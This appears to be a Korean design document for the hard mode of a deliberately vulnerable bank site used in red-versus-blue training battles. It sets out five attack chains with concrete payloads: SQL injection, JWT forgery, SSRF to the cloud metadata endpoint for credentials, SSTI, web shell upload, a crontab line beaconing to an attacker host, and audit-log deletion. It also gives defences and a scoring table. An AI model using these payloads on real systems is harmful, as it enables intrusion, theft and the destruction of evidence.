# NeoBank — HARD mode 5 Chain (P13 Phase 3)

> **HARD 모드**: 기존 30 vuln 위에 **다단계 chain 5개** 추가. 한 step 만으로 막혀도
> 다음 chain 으로 우회 가능 → 공방전이 오래 지속. Battle 의 BLUE 가 차단해도 RED 는
> 다른 chain 으로 시도. 점수 가중: 단일 vuln +5~10, chain 완주 +50~80.

## 강조 차별점 (vs Normal)
- **다단계 chain**: 단일 endpoint 가 아니라 4~6 endpoint 연쇄 → exploit 자동화 (Burp Intruder/sqlmap)
- **상태 의존**: 이전 단계 결과(token, account_id, balance)가 다음 단계 입력
- **방어 우회**: BLUE 의 부분 차단 (예: rate-limit) 을 다른 endpoint 로 우회

---

## Chain 1: 자격 증명 인수 → 자금 탈취 (CCAT — Credential & Custody Account Takeover)
**점수 +60** · **MITRE T1078 + T1539 + T1098**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 1.1 | SQLi 로 admin 인증 우회 토큰 획득 | `POST /api/login` | V01 SQLi (`email=' OR 1=1--`) | `token` 응답 |
| 1.2 | 토큰으로 mass assignment, role=admin 으로 escalation | `POST /api/profile/update` | V20 mass assign (`{"role":"admin","balance":99999999}`) | role:admin 확인 |
| 1.3 | admin endpoint 로 모든 사용자 PII + balance dump | `GET /api/admin/users` | V18 broken admin auth + V19 PII 평문 | ssn/balance 노출 |
| 1.4 | 가장 잔액 높은 victim 식별 후 transfer execute | `POST /transfer` (csrf_token 없이) | V10 CSRF + V11 IDOR (from_account 검증 0) | transaction_id |
| 1.5 | transfer 흔적 audit log 에서 삭제 | `POST /api/audit/clear?actor=admin` | V12 audit tampering | 로그 0 확인 |

**완주 시**: victim 잔액 → attacker 계좌 + 흔적 0건. BLUE 가 #1.1 (SQLi) 만 차단해도 #1.2 (mass assign) 로 시작 가능.

---

## Chain 2: GraphQL/REST 우회 → 무한 차익 거래 (Arbitrage Loop)
**점수 +50** · **MITRE T1190 + business logic abuse**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 2.1 | 환율 endpoint 의 정수 underflow — `amount=-1000000` | `POST /transfer {"amount":-1000000,"to":"self"}` | V14 BizLogic — 음수 금액 검증 0 | 잔액 +1M |
| 2.2 | 동일 transaction race — Burp Intruder 로 100 동시 요청 | `POST /transfer` 100 parallel | V15 Race condition (no DB lock) | balance > expected |
| 2.3 | 거래 history pagination DoS (limit=999999) | `GET /statements?limit=999999` | V25 No pagination cap | 응답 시간 30s+ |
| 2.4 | rollback endpoint 로 victim 의 정상 transfer cancel | `POST /transfer/<tid>/cancel` (다른 사람 tid) | V11 IDOR variant | 200 + balance 변동 |

**완주 시**: 무한 잔액 + victim 자금 환수 차단. BLUE 가 race lock 추가해도 underflow 로 우회.

---

## Chain 3: JWT/Session 위조 → 영구 백도어 (Persistent Auth Bypass)
**점수 +70** · **MITRE T1556 + T1136**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 3.1 | JWT alg=none 으로 sub=admin 위조 토큰 생성 | (local) | V05 JWT none + V04 weak secret `bank-jwt-2023` | base64 jwt |
| 3.2 | 위조 토큰으로 신규 admin 계정 생성 | `POST /api/users/check` 또는 `/register` | V20 mass assign (role:admin) | 새 user_id |
| 3.3 | 새 admin 의 api_key 추출 → 외부 노출 가능 | `GET /api/admin/users` | V18 + V19 | api_key |
| 3.4 | profile recover endpoint 로 victim password 직접 변경 | `POST /api/profile/recover` (toy email) | V22 weak password reset | 200 OK |
| 3.5 | 변경된 password 로 victim 로그인 → SSO 가로채기 | `POST /login` victim email + new pwd | normal flow + V09 brute fallback | session token |

**완주 시**: 영구 admin 백도어 + victim 계정 인수. BLUE 가 alg=none 차단해도 V04 weak secret HS256 로 위조 가능.

---

## Chain 4: SSRF → 내부 네트워크 정찰 → C2 (Lateral via SSRF)
**점수 +50** · **MITRE T1090 + T1592**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 4.1 | webhook test 로 cloud metadata 조회 | `GET /api/webhook/test?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` | V13 SSRF | AWS credentials |
| 4.2 | receipts/render endpoint 로 file:// LFI | `GET /api/receipts/render?path=/etc/passwd` | V17 path traversal | passwd 내용 |
| 4.3 | render endpoint 로 SSTI (Jinja2) → RCE | `GET /render?tpl={{config.items()}}` | V21 SSTI variant | 환경변수 노출 |
| 4.4 | session restore 로 pickle deserialization | `POST /api/session/restore` raw pickle | V23 pickle | code exec |

**완주 시**: 컨테이너 내부 RCE + AWS credentials. BLUE 가 SSRF allowlist 적용해도 file:// 또는 SSTI 로 우회.

---

## Chain 5: 웹쉘 업로드 → 영구 지속성 (Web Shell Persistence)
**점수 +80** · **MITRE T1505.003 + T1546**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 5.1 | 사용자 검색에서 NoSQL/SQL injection 으로 admin 탐지 | `GET /search?q=admin' OR 1=1--` | V01 + V19 PII | admin user_id |
| 5.2 | profile update 로 avatar 업로드 — `.php` 또는 `.jsp` upload | `POST /api/profile/update {"avatar":"shell.php"}` | V24 file upload validation 0 | path 응답 |
| 5.3 | 업로드된 shell 직접 호출 → cmd execution | `GET /uploads/<uid>_shell.php?cmd=id` | RCE | uid=root 또는 web user |
| 5.4 | crontab 또는 systemd timer 로 영속성 확보 | `... cmd=echo "* * * * * curl http://attacker/beacon" \| crontab -` | post-exploit | crontab -l 출력 |
| 5.5 | audit log + recent commands 정리 | `... cmd=history -c && rm /var/log/audit/*` | V12 + filesystem | log 0 |

**완주 시**: 영구 웹쉘 + 자동 beacon. BLUE 가 .php 차단해도 .jsp/.jspx/.asp 로 우회.

---

## BLUE 권장 차단 (Hard 모드)

| 차단 영역 | 우선순위 | 도구 |
|-----------|----------|------|
| ModSecurity CRS 942/941 paranoia 4 | High | OWASP CRS + custom rules |
| API rate-limit + endpoint-별 quota | High | nginx limit_req + Redis |
| JWT signature alg whitelist (RS256 only) | High | bastion JWT verify_token |
| File upload Content-Type + magic bytes 검증 | High | python-magic + extension allowlist |
| audit log immutable storage (append-only) | Med | systemd-journal seal + offsite |
| SSRF egress allowlist + DNS rebinding 차단 | Med | iptables OUTPUT rule + dnsmasq |
| race condition DB-level lock (FOR UPDATE) | Med | postgres explicit lock |
| Session fixation + token rotation | Low | Flask-Login session_protection |

---

## 점수 가중 (Hard 모드 추가)

| chain | 단순 step 합 | chain 완주 보너스 | 총 |
|-------|-------------|-------------------|-----|
| Chain 1 CCAT | +30 | +30 | **+60** |
| Chain 2 Arbitrage | +25 | +25 | **+50** |
| Chain 3 JWT 위조 | +35 | +35 | **+70** |
| Chain 4 SSRF C2 | +25 | +25 | **+50** |
| Chain 5 WebShell | +40 | +40 | **+80** |
| **합** | **+155** | **+155** | **+310** |

5 chain 완주 시 단일 BATTLE 에서 +310 점 추가 — Normal 모드 (V01-V30 단순 합 ~150) 의 2배.

---

## 운영자 점검

```bash
# Hard mode 활성화 (기존 normal 사이트 그대로 사용 + chain mission 만 추가)
bash contents/vuln-sites/up.sh up   # neobank :3001 그대로
# 강사가 Battle 생성 시 admin UI 에서 difficulty=hard 선택 → 위 5 chain 을 mission 으로 자동 주입
```

**다음 단계 (Phase 4)**:
- Bastion-Bench web-vuln 카테고리에 5 chain 을 hold-out task 로 추가
- 다른 4 사이트 (GovPortal/MediForum/AdminConsole/AICompanion) 도 각 5 chain 작성
